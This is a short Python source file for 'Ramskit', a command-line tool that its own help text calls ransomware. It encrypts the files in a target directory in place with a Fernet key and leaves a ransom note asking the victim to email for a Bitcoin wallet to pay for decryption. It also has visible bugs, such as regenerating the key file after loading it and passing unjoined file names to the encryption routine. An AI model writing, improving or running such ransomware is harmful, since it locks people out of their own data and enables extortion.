#!/usr/bin/python3

""" Copyright (C) 2023 Its-Yayo

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>. """

import os
import sys
import argparse
from cryptography.fernet import Fernet


class Ramskit:
    def __init__(self, key):
        self.key = key

    def generate_key(self):
        self.key = Fernet.generate_key()
        with open('key.txt', 'wb') as f:
            f.write(self.key)
        return self.key

    def encrypt_file(self, items):
        f = Fernet(self.key)
        for item in items:
            with open(item, 'rb') as file:
                data = file.read()

            fernet = Fernet(self.key)
            encrypted = fernet.encrypt(data)

            with open(item, 'wb') as file:
                file.write(encrypted)

    def decrypt_file(self, items):
        f = Fernet(self.key)
        for item in items:
            with open(item, 'rb') as file:
                data = file.read()

            fernet = Fernet(self.key)
            decrypted = fernet.decrypt(data)

            with open(item, 'wb') as file:
                file.write(decrypted)

def load_key():
    return open('key.txt', 'rb').read()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
    parser.add_argument('-a', '--action', dest="action", required=True,
                        help='Action to perform [encrypt/decrypt/generate_key]')
    parser.add_argument('-p', '--path', dest="path", required=True, help='Path to file(s) to encrypt/decrypt')
    args = parser.parse_args()

    action = args.action.lower()
    path = args.path

    key = load_key()

    ramskit = Ramskit(key)
    ramskit.generate_key()

    match action:
        case 'encrypt':
            items = os.listdir(path)
            ramskit.encrypt_file(items)

            with open(path + '/look_at_me.txt', 'w') as f:
                f.write('''
                    Heyo, this file has been encrypted!. 
                    You need to email me so I can give u my BTC wallet for the 
                    decrypt's purchase lololololol \n\n
                ''')
        case 'decrypt':
            os.remove(path + '/look_at_me.txt')
            items = os.listdir(path)

            hole_path = [path + '/' + item for item in items]
            ramskit.decrypt_file(hole_path)

        case 'generate_key':
            print(ramskit.generate_key())
        case _:
            raise Exception('Invalid action: ', action)
            sys.exit(1)

